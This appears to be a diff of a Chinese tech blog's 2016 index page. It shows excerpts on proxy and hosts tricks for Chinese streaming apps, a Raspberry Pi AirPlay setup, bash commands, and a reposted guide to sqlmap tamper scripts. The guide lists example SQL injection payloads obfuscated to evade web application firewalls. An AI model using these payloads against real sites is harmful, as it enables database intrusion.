-
-
-
-
-  
     <article id="post-hai-wai-appsheng-cun-zhi-nan" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2016/08/12/hai-wai-appsheng-cun-zhi-nan/" class="article-date">
-  	<time datetime="2016-08-12T15:13:34.000Z" itemprop="datePublished">2016-08-12</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
+    <div class="article-inner">
         
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/08/12/hai-wai-appsheng-cun-zhi-nan/">海外App生存指南</a>
-    </h1>
-  
-
-      </header>
-      
+        
+            <header class="article-header">
+                
     
-    <div class="article-entry" itemprop="articleBody">
-      
-        <a id="more"></a> 
+        <h1 itemprop="name">
+            <a class="article-title" href="/2016/08/12/hai-wai-appsheng-cun-zhi-nan/">海外App生存指南</a>
+        </h1>
+    
+
+                
+                    <div class="article-meta">
+                        
+    <div class="article-date">
+        <i class="fa fa-calendar"></i>
+        <a href="/2016/08/12/hai-wai-appsheng-cun-zhi-nan/">
+            <time datetime="2016-08-12T15:13:34.000Z" itemprop="datePublished">2016-08-12</time>
+        </a>
+    </div>
+
+
+                        
+                        
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link" href="/tags/原创/"> - 原创</a>
+    </div>
+
+                    </div>
+                
+            </header>
+        
+        
+        <div class="article-entry" itemprop="articleBody">
+        
+            
+            <a id="more"></a> 
 <p>#DNS/PAC大法</p>
 <p>##优酷土豆爱奇艺<br>在 iOS 的 Wi-Fi 设置当中，点进某个 Wi-Fi 的属性页面，拖到最下面设置「HTTP 代理」-「自动」为：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://pac.uku.im/pac.pac</div></pre></td></tr></table></figure></p>
 <p>DNS:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">158.69.209.100</div></pre></td></tr></table></figure></p>
@@ -469,184 +763,390 @@
 <p>#替换hosts大法</p>
 <p>##网易云音乐<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">104.236.189.178 http://music.163.com </div><div class="line">198.47.104.134 http://m1.music.126.net </div><div class="line">198.47.104.134 http://m2.music.126.net </div><div class="line">198.47.104.134 http://m3.music.126.net </div><div class="line">198.47.104.134 http://m4.music.126.net</div><div class="line">198.47.104.134 http://m5.music.126.net </div><div class="line">198.47.104.134 http://m6.music.126.net </div><div class="line">198.47.104.134 http://m7.music.126.net </div><div class="line">198.47.104.134 http://m8.music.126.net </div><div class="line">198.47.104.134 http://m9.music.126.net </div><div class="line">198.47.104.134 http://m10.music.126.net</div></pre></td></tr></table></figure></p>
 
-      
+        
+        </div>
+        <footer class="article-footer">
+            <div class="share-container">
+
+
+
+</div>
+
+    <a data-url="http://my.yfgeek.com/2016/08/12/hai-wai-appsheng-cun-zhi-nan/" data-id="cisyte7dr000pzds5bqwgedkb" class="article-share-link"><i class="fa fa-share"></i>分享到</a>
+<script>
+    (function ($) {
+        // Prevent duplicate binding
+        if (typeof(__SHARE_BUTTON_BINDED__) === 'undefined' || !__SHARE_BUTTON_BINDED__) {
+            __SHARE_BUTTON_BINDED__ = true;
+        } else {
+            return;
+        }
+        $('body').on('click', function() {
+            $('.article-share-box.on').removeClass('on');
+        }).on('click', '.article-share-link', function(e) {
+            e.stopPropagation();
+
+            var $this = $(this),
+                url = $this.attr('data-url'),
+                encodedUrl = encodeURIComponent(url),
+                id = 'article-share-box-' + $this.attr('data-id'),
+                offset = $this.offset(),
+                box;
+
+            if ($('#' + id).length) {
+                box = $('#' + id);
+
+                if (box.hasClass('on')){
+                    box.removeClass('on');
+                    return;
+                }
+            } else {
+                var html = [
+                    '<div id="' + id + '" class="article-share-box">',
+                        '<input class="article-share-input" value="' + url + '">',
+                        '<div class="article-share-links">',
+                            '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="fa fa-twitter article-share-twitter" target="_blank" title="Twitter"></a>',
+                            '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="fa fa-facebook article-share-facebook" target="_blank" title="Facebook"></a>',
+                            '<a href="http://pinterest.com/pin/create/button/?url=' + encodedUrl + '" class="fa fa-pinterest article-share-pinterest" target="_blank" title="Pinterest"></a>',
+                            '<a href="https://plus.google.com/share?url=' + encodedUrl + '" class="fa fa-google article-share-google" target="_blank" title="Google+"></a>',
+                        '</div>',
+                    '</div>'
+                ].join('');
+
+              box = $(html);
+
+              $('body').append(box);
+            }
+
+            $('.article-share-box.on').hide();
+
+            box.css({
+                top: offset.top + 25,
+                left: offset.left
+            }).addClass('on');
+
+        }).on('click', '.article-share-box', function (e) {
+            e.stopPropagation();
+        }).on('click', '.article-share-box-input', function () {
+            $(this).select();
+        }).on('click', '.article-share-box-link', function (e) {
+            e.preventDefault();
+            e.stopPropagation();
+
+            window.open(this.href, 'article-share-box-window-' + Date.now(), 'width=500,height=450');
+        });
+    })(jQuery);
+</script>
+
+            
+    
+        <a href="http://my.yfgeek.com/2016/08/12/hai-wai-appsheng-cun-zhi-nan/#comments" class="article-comment-link disqus-comment-count" data-disqus-url="http://my.yfgeek.com/2016/08/12/hai-wai-appsheng-cun-zhi-nan/">评论</a>
+    
+
+        </footer>
     </div>
     
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/原创/"> - 原创</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
 </article>
 
 
 
-
-
-
-
-
-
-  
     <article id="post-airplay" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2016/08/07/airplay/" class="article-date">
-  	<time datetime="2016-08-07T13:23:56.000Z" itemprop="datePublished">2016-08-07</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
+    <div class="article-inner">
         
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/08/07/airplay/">用树莓派把蓝牙音响变成Airplay音响</a>
-    </h1>
-  
-
-      </header>
-      
+        
+            <header class="article-header">
+                
     
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>#前言<br>最近买了小米蓝牙音响，使用一段时间后发现小米蓝牙音箱有一个极其不方便的地方就是家里苹果设备比较多，想切换设备播放的时候就比较麻烦，还要断开操作。<br>于是萌生了一个想法，正好手上有个树莓派，能不能这样：</p>
+        <h1 itemprop="name">
+            <a class="article-title" href="/2016/08/07/airplay/">用树莓派把蓝牙音响变成Airplay音响</a>
+        </h1>
+    
+
+                
+                    <div class="article-meta">
+                        
+    <div class="article-date">
+        <i class="fa fa-calendar"></i>
+        <a href="/2016/08/07/airplay/">
+            <time datetime="2016-08-07T13:23:56.000Z" itemprop="datePublished">2016-08-07</time>
+        </a>
+    </div>
+
+
+                        
+                        
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link" href="/tags/原创-树莓派/"> - 原创 - 树莓派</a>
+    </div>
+
+                    </div>
+                
+            </header>
+        
+        
+        <div class="article-entry" itemprop="articleBody">
+        
+            <p><p>#前言<br>最近买了小米蓝牙音响，使用一段时间后发现小米蓝牙音箱有一个极其不方便的地方就是家里苹果设备比较多，想切换设备播放的时候就比较麻烦，还要断开操作。<br>于是萌生了一个想法，正好手上有个树莓派，能不能这样：</p>
 <blockquote>
-<p>iOS设备-&gt;Airplay-&gt;树莓派-&gt;蓝牙-&gt;小米蓝牙音箱<br>
-      
+<p>iOS设备-&gt;Airplay-&gt;树莓派-&gt;蓝牙-&gt;小米蓝牙音箱<br></p>
+            <p class="article-more-link">
+                <a href="/2016/08/07/airplay/#more">查看更多</a>
+            </p>
+        
+        </div>
+        <footer class="article-footer">
+            <div class="share-container">
+
+
+
+</div>
+
+    <a data-url="http://my.yfgeek.com/2016/08/07/airplay/" data-id="cisyte7dt000rzds5404t38xg" class="article-share-link"><i class="fa fa-share"></i>分享到</a>
+<script>
+    (function ($) {
+        // Prevent duplicate binding
+        if (typeof(__SHARE_BUTTON_BINDED__) === 'undefined' || !__SHARE_BUTTON_BINDED__) {
+            __SHARE_BUTTON_BINDED__ = true;
+        } else {
+            return;
+        }
+        $('body').on('click', function() {
+            $('.article-share-box.on').removeClass('on');
+        }).on('click', '.article-share-link', function(e) {
+            e.stopPropagation();
+
+            var $this = $(this),
+                url = $this.attr('data-url'),
+                encodedUrl = encodeURIComponent(url),
+                id = 'article-share-box-' + $this.attr('data-id'),
+                offset = $this.offset(),
+                box;
+
+            if ($('#' + id).length) {
+                box = $('#' + id);
+
+                if (box.hasClass('on')){
+                    box.removeClass('on');
+                    return;
+                }
+            } else {
+                var html = [
+                    '<div id="' + id + '" class="article-share-box">',
+                        '<input class="article-share-input" value="' + url + '">',
+                        '<div class="article-share-links">',
+                            '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="fa fa-twitter article-share-twitter" target="_blank" title="Twitter"></a>',
+                            '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="fa fa-facebook article-share-facebook" target="_blank" title="Facebook"></a>',
+                            '<a href="http://pinterest.com/pin/create/button/?url=' + encodedUrl + '" class="fa fa-pinterest article-share-pinterest" target="_blank" title="Pinterest"></a>',
+                            '<a href="https://plus.google.com/share?url=' + encodedUrl + '" class="fa fa-google article-share-google" target="_blank" title="Google+"></a>',
+                        '</div>',
+                    '</div>'
+                ].join('');
+
+              box = $(html);
+
+              $('body').append(box);
+            }
+
+            $('.article-share-box.on').hide();
+
+            box.css({
+                top: offset.top + 25,
+                left: offset.left
+            }).addClass('on');
+
+        }).on('click', '.article-share-box', function (e) {
+            e.stopPropagation();
+        }).on('click', '.article-share-box-input', function () {
+            $(this).select();
+        }).on('click', '.article-share-box-link', function (e) {
+            e.preventDefault();
+            e.stopPropagation();
+
+            window.open(this.href, 'article-share-box-window-' + Date.now(), 'width=500,height=450');
+        });
+    })(jQuery);
+</script>
+
+            
+    
+        <a href="http://my.yfgeek.com/2016/08/07/airplay/#comments" class="article-comment-link disqus-comment-count" data-disqus-url="http://my.yfgeek.com/2016/08/07/airplay/">评论</a>
+    
+
+        </footer>
     </div>
     
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/原创-树莓派/"> - 原创 - 树莓派</a></li></ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a  href="/2016/08/07/airplay/#more">more >></a>
-        </p>
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
 </article>
 
 
 
-
-
-
-
-
-
-  
     <article id="post-bash" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2016/08/06/bash/" class="article-date">
-  	<time datetime="2016-08-05T16:36:19.000Z" itemprop="datePublished">2016-08-06</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
+    <div class="article-inner">
         
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/08/06/bash/">常用Bash命令总结</a>
-    </h1>
-  
-
-      </header>
-      
+        
+            <header class="article-header">
+                
     
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>自从入了Mac后，感觉敲命令更加方便了，对于我这种半吊子青年，一直号称不会写脚本的前端不是好美工，总结了一些命令，仅供参考，省去了最简单的命令，不过部分也比较简单：</p>
-      
+        <h1 itemprop="name">
+            <a class="article-title" href="/2016/08/06/bash/">常用Bash命令总结</a>
+        </h1>
+    
+
+                
+                    <div class="article-meta">
+                        
+    <div class="article-date">
+        <i class="fa fa-calendar"></i>
+        <a href="/2016/08/06/bash/">
+            <time datetime="2016-08-05T16:36:19.000Z" itemprop="datePublished">2016-08-06</time>
+        </a>
+    </div>
+
+
+                        
+                        
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link" href="/tags/原创-Tool/"> - 原创 - Tool</a>
+    </div>
+
+                    </div>
+                
+            </header>
+        
+        
+        <div class="article-entry" itemprop="articleBody">
+        
+            <p><p>自从入了Mac后，感觉敲命令更加方便了，对于我这种半吊子青年，一直号称不会写脚本的前端不是好美工，总结了一些命令，仅供参考，省去了最简单的命令，不过部分也比较简单：</p></p>
+            <p class="article-more-link">
+                <a href="/2016/08/06/bash/#more">查看更多</a>
+            </p>
+        
+        </div>
+        <footer class="article-footer">
+            <div class="share-container">
+
+
+
+</div>
+
+    <a data-url="http://my.yfgeek.com/2016/08/06/bash/" data-id="cisyte7dk000gzds5cvx902tz" class="article-share-link"><i class="fa fa-share"></i>分享到</a>
+<script>
+    (function ($) {
+        // Prevent duplicate binding
+        if (typeof(__SHARE_BUTTON_BINDED__) === 'undefined' || !__SHARE_BUTTON_BINDED__) {
+            __SHARE_BUTTON_BINDED__ = true;
+        } else {
+            return;
+        }
+        $('body').on('click', function() {
+            $('.article-share-box.on').removeClass('on');
+        }).on('click', '.article-share-link', function(e) {
+            e.stopPropagation();
+
+            var $this = $(this),
+                url = $this.attr('data-url'),
+                encodedUrl = encodeURIComponent(url),
+                id = 'article-share-box-' + $this.attr('data-id'),
+                offset = $this.offset(),
+                box;
+
+            if ($('#' + id).length) {
+                box = $('#' + id);
+
+                if (box.hasClass('on')){
+                    box.removeClass('on');
+                    return;
+                }
+            } else {
+                var html = [
+                    '<div id="' + id + '" class="article-share-box">',
+                        '<input class="article-share-input" value="' + url + '">',
+                        '<div class="article-share-links">',
+                            '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="fa fa-twitter article-share-twitter" target="_blank" title="Twitter"></a>',
+                            '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="fa fa-facebook article-share-facebook" target="_blank" title="Facebook"></a>',
+                            '<a href="http://pinterest.com/pin/create/button/?url=' + encodedUrl + '" class="fa fa-pinterest article-share-pinterest" target="_blank" title="Pinterest"></a>',
+                            '<a href="https://plus.google.com/share?url=' + encodedUrl + '" class="fa fa-google article-share-google" target="_blank" title="Google+"></a>',
+                        '</div>',
+                    '</div>'
+                ].join('');
+
+              box = $(html);
+
+              $('body').append(box);
+            }
+
+            $('.article-share-box.on').hide();
+
+            box.css({
+                top: offset.top + 25,
+                left: offset.left
+            }).addClass('on');
+
+        }).on('click', '.article-share-box', function (e) {
+            e.stopPropagation();
+        }).on('click', '.article-share-box-input', function () {
+            $(this).select();
+        }).on('click', '.article-share-box-link', function (e) {
+            e.preventDefault();
+            e.stopPropagation();
+
+            window.open(this.href, 'article-share-box-window-' + Date.now(), 'width=500,height=450');
+        });
+    })(jQuery);
+</script>
+
+            
+    
+        <a href="http://my.yfgeek.com/2016/08/06/bash/#comments" class="article-comment-link disqus-comment-count" data-disqus-url="http://my.yfgeek.com/2016/08/06/bash/">评论</a>
+    
+
+        </footer>
     </div>
     
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/原创-Tool/"> - 原创 - Tool</a></li></ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a  href="/2016/08/06/bash/#more">more >></a>
-        </p>
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
 </article>
 
 
 
-
-
-
-
-
-
-  
     <article id="post-sqlmapzhu-ru-zhi-tamperrao-guo-waffang-huo-qiang-guo-lu" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2016/08/05/sqlmapzhu-ru-zhi-tamperrao-guo-waffang-huo-qiang-guo-lu/" class="article-date">
-  	<time datetime="2016-08-05T10:35:41.000Z" itemprop="datePublished">2016-08-05</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
+    <div class="article-inner">
         
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/08/05/sqlmapzhu-ru-zhi-tamperrao-guo-waffang-huo-qiang-guo-lu/">sqlmap注入之tamper绕过WAF防火墙过滤</a>
-    </h1>
-  
-
-      </header>
-      
+        
+            <header class="article-header">
+                
     
-    <div class="article-entry" itemprop="articleBody">
-      
-        <a id="more"></a> 
+        <h1 itemprop="name">
+            <a class="article-title" href="/2016/08/05/sqlmapzhu-ru-zhi-tamperrao-guo-waffang-huo-qiang-guo-lu/">sqlmap注入之tamper绕过WAF防火墙过滤</a>
+        </h1>
+    
+
+                
+                    <div class="article-meta">
+                        
+    <div class="article-date">
+        <i class="fa fa-calendar"></i>
+        <a href="/2016/08/05/sqlmapzhu-ru-zhi-tamperrao-guo-waffang-huo-qiang-guo-lu/">
+            <time datetime="2016-08-05T10:35:41.000Z" itemprop="datePublished">2016-08-05</time>
+        </a>
+    </div>
+
+
+                        
+                        
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link" href="/tags/转载-Hack/"> - 转载 - Hack</a>
+    </div>
+
+                    </div>
+                
+            </header>
+        
+        
+        <div class="article-entry" itemprop="articleBody">
+        
+            
+            <a id="more"></a> 
 <p><img data-url="/content/images/2016/08/wallhaven-131694-2.jpg" class="lazy cover" alt="cover"></p>
 <p></p><p>每当注入的时候看到这个贱贱的提示框，内心有千万只草泥马在奔腾。</p><br><img class="aligncenter size-full wp-image-2087" src="http://www.vuln.cn/wp-content/uploads/2015/09/tamper.png" alt="sqlmap的tamper绕过waf" width="622" height="386"><br><img class="aligncenter size-full wp-image-2088" src="http://www.vuln.cn/wp-content/uploads/2015/09/tamper1.png" alt="sqlmap的tamper绕过waf" width="449" height="289"><p></p>
 <p></p><p>但很多时候还是得静下来分析过滤系统到底过滤了哪些参数，该如何绕过。</p><p></p>
@@ -756,62 +1256,132 @@
 <p><div class="line number4 index3 alt1"><code class="sql plain">*&nbsp;&nbsp; </code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">Output</code><code class="sql plain">: 1%23PTTmJopxdWJ%0AAND%23cWfcVRPV%0A9227=9227</code></div><br><br><br><br><br><br><br></p>
 <p></p><p style="color: #555555;">Requirement:</p><p></p>
 <ul style="color: #555555;"><br><li>MySQL Tested against:</li><br><li>MySQL 4.0, 5.0</li><br></ul><br><h2 style="font-weight: 400; color: #555555;">脚本名：apostrophenullencode.py</h2><br><hr style="color: #555555;"><br><p style="color: #555555;">作用：绕过过滤双引号，替换字符和双引号。</p><br><div style="color: #555555;"><br><div id="highlighter_913012" class="syntaxhighlighter  sql"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td class="gutter" style="color: #afafaf !important;"><br><div class="line number1 index0 alt2">1</div><br></td><br><td class="code"><br><div class="container"><br><div class="line number1 index0 alt2"><code class="sql plain">Example: tamper(</code><code class="sql string" style="color: blue !important;">“1 AND ‘1’=’1”</code><code class="sql plain">) ‘1 </code><code class="sql color1" style="color: gray !important;">AND</code> <code class="sql plain">%00%271%00%27=%00%271’</code></div><br></div><br></td><br></tr><br></tbody><br></table><br></div><br></div><br><p style="color: #555555;">Tested against:</p><br><ul style="color: #555555;"><br><li>MySQL 4, 5.0 and 5.5</li><br><li>Oracle 10g</li><br><li>PostgreSQL 8.3, 8.4, 9.0</li><br></ul><br><h2 style="font-weight: 400; color: #555555;">脚本名：halfversionedmorekeywords.py</h2><br><hr style="color: #555555;"><br><p style="color: #555555;">作用：当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论</p><br><div style="color: #555555;"><br><div id="highlighter_654010" class="syntaxhighlighter  sql"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td class="gutter" style="color: #afafaf !important;"><br><div class="line number1 index0 alt2">1</div><br><div class="line number2 index1 alt1">2</div><br><div class="line number3 index2 alt2">3</div><br></td><br><td class="code"><br><div class="container"><br><div class="line number1 index0 alt2"><code class="sql plain">Example:</code></div><br><div class="line number2 index1 alt1"></div><br><div class="line number3 index2 alt2"><code class="sql plain">(</code><code class="sql string" style="color: blue !important;">“value’ UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND ‘QDWa’=’QDWa”</code><code class="sql plain">) </code><code class="sql string" style="color: blue !important;">“value’/<em>!0UNION/</em>!0ALL/<em>!0SELECT/</em>!0CONCAT(/<em>!0CHAR(58,107,112,113,58),/</em>!0IFNULL(CAST(/<em>!0CURRENT_USER()/</em>!0AS/<em>!0CHAR),/</em>!0CHAR(32)),/<em>!0CHAR(58,97,110,121,58)),/</em>!0NULL,/<em>!0NULL#/</em>!0AND ‘QDWa’=’QDWa”</code></div><br></div><br></td><br></tr><br></tbody><br></table><br></div><br></div><br><p style="color: #555555;">Requirement:</p><br><ul style="color: #555555;"><br><li>MySQL &lt; 5.1</li><br></ul><br><p style="color: #555555;">Tested against:</p><br><ul style="color: #555555;"><br><li>MySQL 4.0.18, 5.0.22</li><br></ul><br><h2 style="font-weight: 400; color: #555555;">脚本名：space2morehash.py</h2><br><hr style="color: #555555;"><br><p style="color: #555555;">作用：空格替换为 #号 以及更多随机字符串 换行符</p><br><div style="color: #555555;"><br><div id="highlighter_996632" class="syntaxhighlighter  sql"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td class="gutter" style="color: #afafaf !important;"><br><div class="line number1 index0 alt2">1</div><br><div class="line number2 index1 alt1">2</div><br><div class="line number3 index2 alt2">3</div><br><div class="line number4 index3 alt1">4</div><br><div class="line number5 index4 alt2">5</div><br></td><br><td class="code"><br><div class="container"><br><div class="line number1 index0 alt2"><code class="sql plain">Example: </code></div><br><div class="line number2 index1 alt1"></div><br><div class="line number3 index2 alt2"><code class="sql plain"><em> Input: 1 </em></code><code class="sql color1" style="color: gray !important;">AND</code> <code class="sql plain">9227=9227 </code></div><br><div class="line number4 index3 alt1"></div><br><div class="line number5 index4 alt2"><code class="sql plain"> </code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">Output</code><code class="sql plain">: 1%23PTTmJopxdWJ%0AAND%23cWfcVRPV%0A9227=9227 </code></div><br></div><br></td><br></tr><br></tbody><br></table><br></div><br></div><br><p style="color: #555555;">Requirement: <em> MySQL &gt;= 5.1.13 Tested</em></p><br><p style="color: #555555;">against:  MySQL 5.1.41</p><br><p style="color: #555555;">案例一:<a style="color: #337ab7;" href="http://www.91ri.org/5411.html" target="_blank" rel="external">91ri一篇文章</a></p><br><h2 style="font-weight: 400; color: #555555;">脚本名：appendnullbyte.py</h2><br><hr style="color: #555555;"><br><p style="color: #555555;">作用：在有效负荷结束位置加载零字节字符编码</p><br><div style="color: #555555;"><br><div id="highlighter_379295" class="syntaxhighlighter  sql"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td class="gutter" style="color: #afafaf !important;"><br><div class="line number1 index0 alt2">1</div><br></td><br><td class="code"><br><div class="container"><br><div class="line number1 index0 alt2"><code class="sql plain">Example: (</code><code class="sql string" style="color: blue !important;">‘1 AND 1=1’</code><code class="sql plain">) </code><code class="sql string" style="color: blue !important;">‘1 AND 1=1%00’</code></div><br></div><br></td><br></tr><br></tbody><br></table><br></div><br></div><br><p style="color: #555555;">Requirement:</p><br><ul style="color: #555555;"><br><li>Microsoft Access</li><br></ul><br><h2 style="font-weight: 400; color: #555555;">脚本名：ifnull2ifisnull.py</h2><br><hr style="color: #555555;"><br><p style="color: #555555;">作用：绕过对 IFNULL 过滤。 替换类似’IFNULL(A, B)’为’IF(ISNULL(A), B, A)’</p><br><div style="color: #555555;"><br><div id="highlighter_831787" class="syntaxhighlighter  sql"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td class="gutter" style="color: #afafaf !important;"><br><div class="line number1 index0 alt2">1</div><br><div class="line number2 index1 alt1">2</div><br><div class="line number3 index2 alt2">3</div><br></td><br><td class="code"><br><div class="container"><br><div class="line number1 index0 alt2"><code class="sql plain">Example:</code></div><br><div class="line number2 index1 alt1"></div><br><div class="line number3 index2 alt2"><code class="sql plain">(</code><code class="sql string" style="color: blue !important;">‘IFNULL(1, 2)’</code><code class="sql plain">) </code><code class="sql string" style="color: blue !important;">‘IF(ISNULL(1),2,1)’</code></div><br></div><br></td><br></tr><br></tbody><br></table><br></div><br></div><br><p style="color: #555555;">Requirement:</p><br><ul style="color: #555555;"><br><li>MySQL</li><br><li>SQLite (possibly)</li><br><li>SAP MaxDB (possibly)</li><br></ul><br><p style="color: #555555;">Tested against:</p><br><ul style="color: #555555;"><br><li>MySQL 5.0 and 5.5</li><br></ul><br><h2 style="font-weight: 400; color: #555555;">脚本名：space2mssqlblank.py(mssql)</h2><br><hr style="color: #555555;"><br><p style="color: #555555;">作用：空格替换为其它空符号</p><br><p style="color: #555555;">Example: <em> Input: SELECT id FROM users </em> Output: SELECT%08id%02FROM%0Fusers</p><br><p style="color: #555555;">Requirement: <em> Microsoft SQL Server Tested against: </em> Microsoft SQL Server 2000 <em> Microsoft SQL Server 2005</em></p><br><h2 style="font-weight: 400; color: #555555;">ASCII table:</h2><br><hr style="color: #555555;"><br><p style="color: #555555;">案例一: wooyun.org/bugs/wooyun-2010-062878</p><br><h2 style="font-weight: 400; color: #555555;">脚本名：base64encode.py</h2><br><hr style="color: #555555;"><br><p style="color: #555555;">作用：用base64编码替换 Example: (“1′ AND SLEEP(5)#”) ‘MScgQU5EIFNMRUVQKDUpIw==’ Requirement: all</p><br><p style="color: #555555;">案例一: <a href="http://wooyun.org/bugs/wooyun-2010-060071" target="_blank" rel="external">http://wooyun.org/bugs/wooyun-2010-060071</a></p><br><p style="color: #555555;">案例二: <a href="http://wooyun.org/bugs/wooyun-2010-021062" target="_blank" rel="external">http://wooyun.org/bugs/wooyun-2010-021062</a></p><br><p style="color: #555555;">案例三: <a href="http://wooyun.org/bugs/wooyun-2010-043229" target="_blank" rel="external">http://wooyun.org/bugs/wooyun-2010-043229</a></p><br><h2 style="font-weight: 400; color: #555555;">脚本名：space2mssqlhash.py</h2><br><hr style="color: #555555;"><br><p style="color: #555555;">作用：替换空格</p><br><div style="color: #555555;"><br><div id="highlighter_950809" class="syntaxhighlighter  sql"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td class="gutter" style="color: #afafaf !important;"><br><div class="line number1 index0 alt2">1</div><br></td><br><td class="code"><br><div class="container"><br><div class="line number1 index0 alt2"><code class="sql plain">Example: (</code><code class="sql string" style="color: blue !important;">‘1 AND 9227=9227’</code><code class="sql plain">) </code><code class="sql string" style="color: blue !important;">‘1%23%0AAND%23%0A9227=9227’</code> <code class="sql plain">Requirement:  MSSQL <em> MySQL </em></code></div><br></div><br></td><br></tr><br></tbody><br></table><br></div><br></div><br><h2 style="font-weight: 400; color: #555555;">脚本名：modsecurityversioned.py</h2><br><hr style="color: #555555;"><br><p style="color: #555555;">作用：过滤空格，包含完整的查询版本注释</p><br><div style="color: #555555;"><br><div id="highlighter_254956" class="syntaxhighlighter  sql"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td class="gutter" style="color: #afafaf !important;"><br><div class="line number1 index0 alt2">1</div><br></td><br><td class="code"><br><div class="container"><br><div class="line number1 index0 alt2"><code class="sql plain">Example: (</code><code class="sql string" style="color: blue !important;">‘1 AND 2&gt;1–’</code><code class="sql plain">) </code><code class="sql string" style="color: blue !important;">‘1 /!30874AND 2&gt;1<em>/–’</em></code></div><br></div><br></td><br></tr><br></tbody><br></table><br></div><br></div><br><p style="color: #555555;">Requirement:  MySQL</p><br><p style="color: #555555;">Tested against:</p><br><ul style="color: #555555;"><br><li>MySQL 5.0</li><br></ul><br><h2 style="font-weight: 400; color: #555555;">脚本名：space2mysqlblank.py</h2><br><hr style="color: #555555;"><br><p style="color: #555555;">作用：空格替换其它空白符号(mysql)</p><br><div style="color: #555555;"><br><div id="highlighter_899158" class="syntaxhighlighter  sql"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td class="gutter" style="color: #afafaf !important;"><br><div class="line number1 index0 alt2">1</div><br><div class="line number2 index1 alt1">2</div><br><div class="line number3 index2 alt2">3</div><br><div class="line number4 index3 alt1">4</div><br><div class="line number5 index4 alt2">5</div><br></td><br><td class="code"><br><div class="container"><br><div class="line number1 index0 alt2"><code class="sql plain">Example: </code></div><br><div class="line number2 index1 alt1"></div><br><div class="line number3 index2 alt2"><code class="sql plain"><em> Input: </em></code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">SELECT</code> <code class="sql plain">id </code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">FROM</code> <code class="sql plain">users </code></div><br><div class="line number4 index3 alt1"></div><br><div class="line number5 index4 alt2"><code class="sql plain"> </code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">Output</code><code class="sql plain">: </code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">SELECT</code><code class="sql plain">%0Bid%0BFROM%A0users </code></div><br></div><br></td><br></tr><br></tbody><br></table><br></div><br></div><br><p style="color: #555555;">Requirement:</p><br><ul style="color: #555555;"><br><li>MySQL</li><br></ul><br><p style="color: #555555;">Tested against:</p><br><ul style="color: #555555;"><br><li>MySQL 